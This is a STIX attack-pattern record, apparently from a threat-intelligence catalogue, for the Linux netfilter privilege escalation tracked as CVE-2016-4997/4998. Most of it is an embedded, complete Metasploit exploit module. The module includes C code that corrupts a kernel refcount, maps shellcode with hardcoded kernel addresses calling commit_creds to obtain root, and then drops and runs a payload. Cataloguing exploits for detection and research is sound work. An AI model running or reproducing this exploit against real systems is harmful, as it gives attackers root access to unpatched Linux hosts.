{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1972c8b-3ce5-41f3-8784-d2d5247eeb69",
    "created": "2024-08-14T16:59:40.861316Z",
    "modified": "2024-08-14T16:59:40.86132Z",
    "name": "Linux Kernel 4.6.3 Netfilter Privilege Escalation",
    "description": " This module attempts to exploit a netfilter bug on Linux Kernels before 4.6.3, and currently only works against Ubuntu 16.04 (not 16.04.1) with kernel 4.4.0-21-generic.  Several conditions have to be met for successful exploitation: Ubuntu: 1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such) 2. libc6-dev-i386 (ubuntu), glibc-devel.i686 & libgcc.i686 (fedora) needs to be installed to compile Kernel 4.4.0-31-generic and newer are not vulnerable. This exploit does not bypass SMEP/SMAP.  We write the ascii files and compile on target instead of locally since metasm bombs for not having cdefs.h (even if locally installed)  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/netfilter_priv_esc_ipv4.rb",
            "external_id": "netfilter_priv_esc_ipv4.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4997"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4998"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2016/06/24/5"
        },
        {
            "source_name": "reference",
            "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',\n        'Description'    => %q{\n          This module attempts to exploit a netfilter bug on Linux Kernels before 4.6.3, and currently\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel 4.4.0-21-generic.\n\n          Several conditions have to be met for successful exploitation:\n          Ubuntu:\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686 & libgcc.i686 (fedora) needs to be installed to compile\n          Kernel 4.4.0-31-generic and newer are not vulnerable. This exploit does not bypass SMEP/SMAP.\n\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\n          having cdefs.h (even if locally installed)\n        },\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'h00die <mike@stcyrsecurity.com>', # Module\n            'vnik',        # Exploit\n            'Jesse Hertz', # Discovery\n            'Tim Newsham'  # Discovery\n          ],\n        'DisclosureDate' => '2016-06-03',\n        'Platform'       => [ 'linux'],\n        'Arch'           => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\n        'Targets'        =>\n          [\n            [ 'Ubuntu', { } ]\n            #[ 'Fedora', { } ]\n          ],\n        'References'     =>\n          [\n            ['EDB', '40049'],\n            ['CVE', '2016-4997'],\n            ['CVE', '2016-4998'],\n            ['URL', 'https://www.openwall.com/lists/oss-security/2016/06/24/5'],\n            ['URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c'],\n            ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91']\n          ],\n        'Notes'          =>\n          {\n            'Reliability' => [ UNRELIABLE_SESSION ],\n            'Stability'   => [ CRASH_OS_DOWN ],\n          },\n        'DefaultTarget'  => 0))\n    register_options [\n      OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),\n      OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    def iptables_loaded?()\n      # user@ubuntu:~$ grep ip_tables /proc/modules\n      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000\n      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000\n      vprint_status('Checking if ip_tables is loaded in kernel')\n      if target.name == \"Ubuntu\"\n        iptables = read_file('/proc/modules').to_s\n        if iptables.include?('ip_tables')\n          vprint_good('ip_tables.ko is loaded')\n        else\n          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')\n        end\n        return iptables.include?('ip_tables')\n      elsif target.name == \"Fedora\"\n        iptables = read_file('/proc/modules').to_s\n        if iptables.include?('iptable_raw')\n          vprint_good('iptable_raw is loaded')\n        else\n          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')\n        end\n        return iptables.include?('iptable_raw')\n      else\n        return false\n      end\n    end\n\n    return CheckCode::Safe unless iptables_loaded?\n\n    if smep_enabled?\n      print_error('SMEP enabled, system not vulnerable.')\n      return CheckCode::Safe\n    end\n    vprint_good('SMEP is not enabled')\n\n    if smap_enabled?\n      print_error('SMAP enabled, system not vulnerable.')\n      return CheckCode::Safe\n    end\n    vprint_good('SMAP is not enabled')\n\n    unless userns_enabled?\n      vprint_error('Unprivileged user namespaces are not permitted')\n      return CheckCode::Safe\n    end\n    vprint_good('Unprivileged user namespaces are permitted')\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.\n    def has_prereqs?()\n      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')\n      if target.name == \"Ubuntu\"\n        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')\n        if lib.include?('install')\n          vprint_good('libc6-dev-i386 is installed')\n        else\n          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')\n        end\n        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')\n        if multilib.include?('install')\n          vprint_good('gcc-multilib is installed')\n        else\n          print_error('gcc-multilib is not installed.  Compiling will fail.')\n        end\n        gcc = cmd_exec('which gcc')\n        if gcc.include?('gcc')\n          vprint_good('gcc is installed')\n        else\n          print_error('gcc is not installed.  Compiling will fail.')\n        end\n        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')\n      elsif target.name == \"Fedora\"\n        lib = cmd_exec('dnf list installed | grep -E \\'(glibc-devel.i686|libgcc.i686)\\'')\n        if lib.include?('glibc')\n          vprint_good('glibc-devel.i686 is installed')\n        else\n          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')\n        end\n        if lib.include?('libgcc')\n          vprint_good('libgcc.i686 is installed')\n        else\n          print_error('libgcc.i686 is not installed.  Compiling will fail.')\n        end\n        multilib = false #not implemented\n        gcc = false #not implemented\n        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib\n      else\n        return false\n      end\n    end\n\n    compile = false\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\n      if has_prereqs?()\n        compile = true\n        vprint_status('Live compiling exploit on system')\n      else\n        vprint_status('Dropping pre-compiled exploit on system')\n      end\n    end\n\n    desc_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\n    env_ready_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\n    pwn_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\n    payload_file = rand_text_alpha(8)\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"\n\n    # direct copy of code from exploit-db, except removed the check for smep/smap and ip_tables.ko since we can do that in the check area here\n    # removed         #include <netinet/in.h> per busterb comment in PR 7326\n    decr = %q{\n      #define _GNU_SOURCE\n      #include <stdio.h>\n      #include <stdlib.h>\n      #include <string.h>\n      #include <unistd.h>\n      #include <sched.h>\n      #include <netinet/in.h>\n      #include <linux/sched.h>\n      #include <errno.h>\n      #include <sys/types.h>\n      #include <sys/socket.h>\n      #include <sys/ptrace.h>\n      #include <net/if.h>\n      #include <linux/netfilter_ipv4/ip_tables.h>\n      #include <linux/netlink.h>\n      #include <fcntl.h>\n      #include <sys/mman.h>\n\n      #define MALLOC_SIZE 66*1024\n\n      int decr(void *p) {\n          int sock, optlen;\n          int ret;\n          void *data;\n          struct ipt_replace *repl;\n          struct ipt_entry *entry;\n          struct xt_entry_match *ematch;\n          struct xt_standard_target *target;\n          unsigned i;\n\n          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);\n\n          if (sock == -1) {\n                  perror(\"socket\");\n                  return -1;\n          }\n\n          data = malloc(MALLOC_SIZE);\n\n          if (data == NULL) {\n              perror(\"malloc\");\n              return -1;\n          }\n\n          memset(data, 0, MALLOC_SIZE);\n\n          repl = (struct ipt_replace *) data;\n          repl->num_entries = 1;\n          repl->num_counters = 1;\n          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;\n          repl->valid_hooks = 0;\n\n          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));\n          entry->target_offset = 74; // overwrite target_offset\n          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);\n\n          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));\n\n          strcpy(ematch->u.user.name, \"icmp\");\n          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);\n          uint64_t *me = (uint64_t *)(kmatch + 0x58);\n          *me = 0xffffffff821de10d; // magic number!\n\n          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);\n          *match = (uint32_t)kmatch;\n\n          ematch->u.match_size = (short)0xffff;\n\n          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);\n          uint32_t *t = (uint32_t *)target;\n          *t = (uint32_t)kmatch;\n\n          printf(\"[!] Decrementing the refcount. This may take a while...\\n\");\n          printf(\"[!] Wait for the \\\"Done\\\" message (even if you'll get the prompt back).\\n\");\n\n          for (i = 0; i < 0xffffff/2+1; i++) {\n              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);\n          }\n\n          close(sock);\n          free(data);\n          printf(\"[+] Done! Now run ./pwn\\n\");\n\n          return 0;\n      }\n\n      int main(void) {\n          void *stack;\n          int ret;\n\n          printf(\"netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\\n\");\n\n          ret = unshare(CLONE_NEWUSER);\n\n          if (ret == -1) {\n              perror(\"unshare\");\n              return -1;\n          }\n\n          stack = (void *) malloc(65536);\n\n          if (stack == NULL) {\n              perror(\"malloc\");\n              return -1;\n          }\n\n          clone(decr, stack + 65536, CLONE_NEWNET, NULL);\n\n          sleep(1);\n\n          return 0;\n      }\n    }\n\n    # direct copy of code from exploit-db\n    pwn = %q{\n      #include <stdio.h>\n      #include <string.h>\n      #include <errno.h>\n      #include <unistd.h>\n      #include <stdint.h>\n      #include <fcntl.h>\n      #include <sys/mman.h>\n      #include <assert.h>\n\n      #define MMAP_ADDR 0xff814e3000\n      #define MMAP_OFFSET 0xb0\n\n      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);\n      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);\n\n      void __attribute__((regparm(3))) privesc() {\n          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;\n          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;\n          commit_creds(prepare_kernel_cred((uint64_t)NULL));\n      }\n\n      int main() {\n          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);\n          assert(payload == (void *)MMAP_ADDR);\n\n          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);\n\n          memset(shellcode, 0, 0x300000);\n\n          void *ret = memcpy(shellcode, &privesc, 0x300);\n          assert(ret == shellcode);\n\n          printf(\"[+] Escalating privs...\\n\");\n\n          int fd = open(\"/dev/ptmx\", O_RDWR);\n          close(fd);\n\n          assert(!getuid());\n\n          printf(\"[+] We've got root!\");\n\n          return execl(\"/bin/bash\", \"-sh\", NULL);\n      }\n    }\n\n    # the original code printed a line.  However, this is hard to detect due to threading.\n    # so instead we can write a file in /tmp to catch.\n    decr.gsub!(/printf\\(\"\\[\\+\\] Done\\! Now run \\.\\/pwn\\\\n\"\\);/,\n               \"int fd2 = open(\\\"#{env_ready_file}\\\", O_RDWR|O_CREAT, 0777);close(fd2);\" )\n\n    # patch in to run our payload\n    pwn.gsub!(/execl\\(\"\\/bin\\/bash\", \"-sh\", NULL\\);/,\n               \"execl(\\\"#{payload_path}\\\", NULL);\")\n\n    def pwn(payload_path, pwn_file, pwn, compile)\n      # lets write our payload since everythings set for priv esc\n      vprint_status(\"Writing payload to #{payload_path}\")\n      write_file(payload_path, generate_payload_exe)\n      cmd_exec(\"chmod 555 #{payload_path}\")\n      register_file_for_cleanup(payload_path)\n\n      # now lets drop part 2, and finish up.\n      rm_f pwn_file\n      if compile\n        print_status \"Writing pwn executable to #{pwn_file}.c\"\n        rm_f \"#{pwn_file}.c\"\n        write_file(\"#{pwn_file}.c\", pwn)\n        cmd_exec(\"gcc #{pwn_file}.c -O2 -o #{pwn_file}\")\n        register_file_for_cleanup(\"#{pwn_file}.c\")\n      else\n        print_status \"Writing pwn executable to #{pwn_file}\"\n        write_file(pwn_file, pwn)\n      end\n      register_file_for_cleanup(pwn_file)\n      cmd_exec(\"chmod +x #{pwn_file}; #{pwn_file}\")\n    end\n\n    if not compile # we need to override with our pre-created binary\n      # pwn file\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')\n      fd = ::File.open( path, \"rb\")\n      pwn = fd.read(fd.stat.size)\n      fd.close\n      # desc file\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')\n      fd = ::File.open( path, \"rb\")\n      decr = fd.read(fd.stat.size)\n      fd.close\n\n      # overwrite the hardcoded variable names in the compiled versions\n      env_ready_file = '/tmp/okDjTFSS'\n      payload_path = '/tmp/2016_4997_payload'\n    end\n\n    # check for shortcut\n    if datastore['REEXPLOIT']\n      pwn(payload_path, pwn_file, pwn, compile)\n    else\n      rm_f desc_file\n      if compile\n        print_status \"Writing desc executable to #{desc_file}.c\"\n        rm_f \"#{desc_file}.c\"\n        write_file(\"#{desc_file}.c\", decr)\n        register_file_for_cleanup(\"#{desc_file}.c\")\n        output = cmd_exec(\"gcc #{desc_file}.c -m32 -O2 -o #{desc_file}\")\n      else\n        write_file(desc_file, decr)\n      end\n      rm_f env_ready_file\n      register_file_for_cleanup(env_ready_file)\n      #register_file_for_cleanup(desc_file)\n      if not file_exist?(desc_file)\n        vprint_error(\"gcc failure output: #{output}\")\n        fail_with(Failure::Unknown, \"#{desc_file}.c failed to compile\")\n      end\n      if target.name == \"Ubuntu\"\n        vprint_status \"Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created.\"\n      elsif target.name == \"Fedora\"\n        vprint_status \"Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created.\"\n      end\n      cmd_exec(\"chmod +x #{desc_file}; #{desc_file}\")\n      sec_waited = 0\n\n      until sec_waited > datastore['MAXWAIT'] do\n        Rex.sleep(1)\n        if sec_waited % 10 == 0\n          vprint_status(\"Waited #{sec_waited}s so far\")\n        end\n\n        if file_exist?(env_ready_file)\n          print_good(\"desc finished, env ready.\")\n          pwn(payload_path, pwn_file, pwn, compile)\n          return\n        end\n        sec_waited +=1\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-03",
    "x_mitre_platforms": [
        "[ 'linux']"
    ]
}